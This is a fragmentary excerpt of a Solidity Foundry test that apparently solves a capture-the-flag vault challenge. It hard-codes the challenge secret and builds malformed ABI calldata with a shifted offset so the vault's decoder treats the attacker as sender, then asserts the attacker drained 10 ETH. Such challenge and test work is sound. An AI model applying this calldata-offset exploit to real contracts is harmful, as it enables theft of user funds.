...
contract CairoVaultTest is Test {
    ...
    string internal constant SECRET = "ArabsInBlockchain";
    bytes32 secretHash =
    ...
    function setUp() public {
        ...
        vm.prank(owner);
        vault = new CairoVault{value: 10 ether}(
            owner,
    ...
    function test_DrainCairoVault() public {
        ...
        // The real inner payload the decoder should see: sender = attacker.
        bytes memory realStruct = abi.encode(
            CairoVault.Input({sender: attacker, secret: SECRET})
        );

        bytes memory payload = abi.encodePacked(
            CairoVault.unlock.selector,
            uint256(0x40),
            uint256(uint160(owner)),
            uint256(realStruct.length),
            realStruct
        );
        ...
        // Attacker drained all 10 ETH without being the owner.
        assertEq(attacker.balance, 10 ether, "attacker did not drain vault");
